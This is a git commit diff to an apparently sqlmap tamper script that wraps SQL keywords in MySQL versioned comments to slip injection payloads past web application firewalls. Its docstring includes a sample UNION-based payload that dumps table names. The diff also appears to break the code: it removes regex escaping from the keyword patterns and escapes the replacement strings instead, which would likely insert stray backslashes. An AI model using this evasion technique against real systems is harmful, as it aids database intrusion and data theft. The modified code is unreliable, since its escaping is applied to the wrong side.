02b9efacb31c017d152a2d53dd9ad7f385e00180
tanaydin <huzursuz@gmail.com>
2025-07-24 23:14:42 +0200

    Removed escaping every run, added escaped strings instead

--- tamper/mysqlversioncomment.py
+++ tamper/mysqlversioncomment.py
@@ -11,8 +11,10 @@ from lib.core.enums import PRIORITY
 
 __priority__ = PRIORITY.NORMAL
 
+
 def dependencies():
     pass
+
 
 def tamper(payload, **kwargs):
     """
@@ -34,59 +36,53 @@ def tamper(payload, **kwargs):
     '1 AND 1=1 /*!50000UNION*/ /*!50000ALL*/ /*!50000SELECT*/ 1,/*!50000GROUP_CONCAT*/(/*!50000table_name*/),3 /*!50000FROM*/ /*!50000INFORMATION_SCHEMA.TABLES*/ /*!50000WHERE*/ /*!50000table_schema*/=/*!50000database()*/'
     """
     keywords = {
-        "SELECT": "/*!50000SELECT*/",
-        "UNION": "/*!50000UNION*/",
-        "INSERT": "/*!50000INSERT*/",
-        "UPDATE": "/*!50000UPDATE*/",
-        "DELETE": "/*!50000DELETE*/",
-        "FROM": "/*!50000FROM*/",
-        "WHERE": "/*!50000WHERE*/",
-        "GROUP BY": "/*!50000GROUP BY*/",
-        "ORDER BY": "/*!50000ORDER BY*/",
-        "LIMIT": "/*!50000LIMIT*/",
-        "ALL": "/*!50000ALL*/",
-        "DISTINCT": "/*!50000DISTINCT*/",
-        "INFORMATION_SCHEMA.TABLES": "/*!50000INFORMATION_SCHEMA.TABLES*/",
-        "INFORMATION_SCHEMA.COLUMNS": "/*!50000INFORMATION_SCHEMA.COLUMNS*/",
-        "TABLE_NAME": "/*!50000TABLE_NAME*/",
-        "COLUMN_NAME": "/*!50000COLUMN_NAME*/",
-        "TABLE_SCHEMA": "/*!50000TABLE_SCHEMA*/",
-        "CONCAT": "/*!50000CONCAT*/",
-        "CONCAT_WS": "/*!50000CONCAT_WS*/",
-        "GROUP_CONCAT": "/*!50000GROUP_CONCAT*/",
-        "COUNT": "/*!50000COUNT*/",
-        "SUBSTRING": "/*!50000SUBSTRING*/",
-        "CAST": "/*!50000CAST*/",
-        "CHAR": "/*!50000CHAR*/",
-        "ASCII": "/*!50000ASCII*/",
-        "ORD": "/*!50000ORD*/",
-        "BENCHMARK": "/*!50000BENCHMARK*/",
-        "SLEEP": "/*!50000SLEEP*/",
-        "DATABASE()": "/*!50000DATABASE()*/",
-        "USER()": "/*!50000USER()*/",
-        "SESSION_USER()": "/*!50000SESSION_USER()*/",
-        "SYSTEM_USER()": "/*!50000SYSTEM_USER()*/",
-        "VERSION()": "/*!50000VERSION()*/",
-        "@@VERSION": "/*!50000@@VERSION*/",
-        "@@HOSTNAME": "/*!50000@@HOSTNAME*/",
-        "SEPARATOR": "/*!50000SEPARATOR*/",
-        "HAVING": "/*!50000HAVING*/",
-        "INTO": "/*!50000INTO*/",
-        "OUTFILE": "/*!50000OUTFILE*/",
-        "DUMPFILE": "/*!50000DUMPFILE*/",
-        "LOAD_FILE": "/*!50000LOAD_FILE*/",
+        "INFORMATION_SCHEMA.COLUMNS": "/\\*!50000INFORMATION_SCHEMA\\.COLUMNS\\*/",
+        "INFORMATION_SCHEMA.TABLES": "/\\*!50000INFORMATION_SCHEMA\\.TABLES\\*/",
+        "SESSION_USER()": "/\\*!50000SESSION_USER\\(\\)\\*/",
+        "SYSTEM_USER()": "/\\*!50000SYSTEM_USER\\(\\)\\*/",
+        "TABLE_SCHEMA": "/\\*!50000TABLE_SCHEMA\\*/",
+        "GROUP_CONCAT": "/\\*!50000GROUP_CONCAT\\*/",
+        "COLUMN_NAME": "/\\*!50000COLUMN_NAME\\*/",
+        "TABLE_NAME": "/\\*!50000TABLE_NAME\\*/",
+        "DATABASE()": "/\\*!50000DATABASE\\(\\)\\*/",
+        "@@HOSTNAME": "/\\*!50000@@HOSTNAME\\*/",
+        "CONCAT_WS": "/\\*!50000CONCAT_WS\\*/",
+        "SUBSTRING": "/\\*!50000SUBSTRING\\*/",
+        "BENCHMARK": "/\\*!50000BENCHMARK\\*/",
+        "VERSION()": "/\\*!50000VERSION\\(\\)\\*/",
+        "@@VERSION": "/\\*!50000@@VERSION\\*/",
+        "SEPARATOR": "/\\*!50000SEPARATOR\\*/",
+        "LOAD_FILE": "/\\*!50000LOAD_FILE\\*/",
+        "GROUP BY": "/\\*!50000GROUP\\ BY\\*/",
+        "ORDER BY": "/\\*!50000ORDER\\ BY\\*/",
+        "DISTINCT": "/\\*!50000DISTINCT\\*/",
+        "DUMPFILE": "/\\*!50000DUMPFILE\\*/",
+        "OUTFILE": "/\\*!50000OUTFILE\\*/",
+        "SELECT": "/\\*!50000SELECT\\*/",
+        "INSERT": "/\\*!50000INSERT\\*/",
+        "UPDATE": "/\\*!50000UPDATE\\*/",
+        "DELETE": "/\\*!50000DELETE\\*/",
+        "CONCAT": "/\\*!50000CONCAT\\*/",
+        "USER()": "/\\*!50000USER\\(\\)\\*/",
+        "HAVING": "/\\*!50000HAVING\\*/",
+        "UNION": "/\\*!50000UNION\\*/",
+        "WHERE": "/\\*!50000WHERE\\*/",
+        "LIMIT": "/\\*!50000LIMIT\\*/",
+        "COUNT": "/\\*!50000COUNT\\*/",
+        "ASCII": "/\\*!50000ASCII\\*/",
+        "SLEEP": "/\\*!50000SLEEP\\*/",
+        "FROM": "/\\*!50000FROM\\*/",
+        "CAST": "/\\*!50000CAST\\*/",
+        "CHAR": "/\\*!50000CHAR\\*/",
+        "INTO": "/\\*!50000INTO\\*/",
+        "ALL": "/\\*!50000ALL\\*/",
+        "ORD": "/\\*!50000ORD\\*/",
     }
 
     ret_val = payload
 
     if payload:
-        sorted_keywords = sorted(keywords.keys(), key=len, reverse=True)
-
-        for keyword in sorted_keywords:
-            if "()" in keyword:
-                regex_keyword = re.escape(keyword)
-                ret_val = re.sub(r"(?i)\b%s\b" % regex_keyword, keywords[keyword], ret_val)
-            else:
-                ret_val = re.sub(r"(?i)\b%s\b" % re.escape(keyword), keywords[keyword], ret_val)
+        for keyword in keywords:
+            ret_val = re.sub(r"(?i)\b%s\b" % keyword, keywords[keyword], ret_val)
 
     return ret_val
